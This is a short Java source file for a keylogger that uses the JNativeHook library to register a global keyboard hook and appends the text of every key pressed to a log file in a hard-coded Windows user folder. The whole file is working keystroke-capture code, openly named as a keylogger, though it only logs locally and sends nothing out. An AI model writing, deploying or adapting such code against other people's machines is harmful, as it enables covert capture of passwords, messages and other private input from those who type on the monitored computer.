package keylogger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

public class keylogger implements NativeKeyListener {

	public keylogger() throws Exception {

	}

	public void nativeKeyPressed(NativeKeyEvent e) {

		String index = "C:\\Users\\s-xub\\Documents\\keylogger\\";

		try {

			FileWriter w = new FileWriter(index + "log.txt", true);
			w.write(e.getKeyText(e.getKeyCode()) + " ");
			w.close();

		} catch (IOException ex) {

			System.out.println("An error occurred.");

		}
	}

	public void nativeKeyReleased(NativeKeyEvent e) {

	}

	public void nativeKeyTyped(NativeKeyEvent e) {

	}

	public static void main(String[] args) throws Exception {

		try {

			GlobalScreen.registerNativeHook();

		} catch (NativeHookException ex) {

			System.err.println("There was a problem registering the native hook.");
			System.err.println(ex.getMessage());

			System.exit(1);

		}

		GlobalScreen.addNativeKeyListener(new keylogger());

	}

}
